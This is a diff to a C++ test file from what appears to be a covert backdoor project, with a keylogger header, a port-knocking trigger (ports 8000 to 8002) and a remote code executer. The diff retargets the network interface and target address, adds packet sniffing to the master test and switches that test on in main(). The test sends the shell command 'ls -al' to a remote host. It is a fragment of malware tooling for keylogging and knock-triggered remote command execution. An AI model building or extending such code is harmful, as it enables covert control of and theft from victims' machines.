@@ -13,7 +13,7 @@
 
 #include "Keylogger.h"
 
-const std::string interfaceName("wlp59s0");
+const std::string interfaceName("eno1");
 const std::string knockPattern("8000,8001,8002");
 const std::string key("key");
 
@@ -92,18 +92,22 @@ void testKnock() {
 
 void testRceMaster() {
     struct in_addr daddr;
-    daddr.s_addr = 0xc0a80012;
+    daddr.s_addr = 0xc0a80011;
 
     NetworkEngine netEngine(interfaceName, key, knockPattern, knockPort, knockDuration);
 
     RemoteCodeExecuter::sendCommand(&netEngine, daddr, "ls -al");
+
+    netEngine.LoopCallbacks.push_back(RemoteCodeExecuter::netCallback);
+    netEngine.startSniff("ip and tcp");
+    sleep(30);
+    netEngine.stopSniff();
 }
 
 void testRceSlave() {
     NetworkEngine netEngine(interfaceName, key, knockPattern, knockPort, knockDuration);
 
     netEngine.LoopCallbacks.push_back(RemoteCodeExecuter::netCallback);
-
     netEngine.startSniff("ip and tcp");
     sleep(30);
     netEngine.stopSniff();
@@ -116,6 +120,7 @@ int main(int argc, char *argv[]) {
     // testKeylogger();
     // testNet();
     // testKnock();
+    testRceMaster();
 
     return 0;
 }
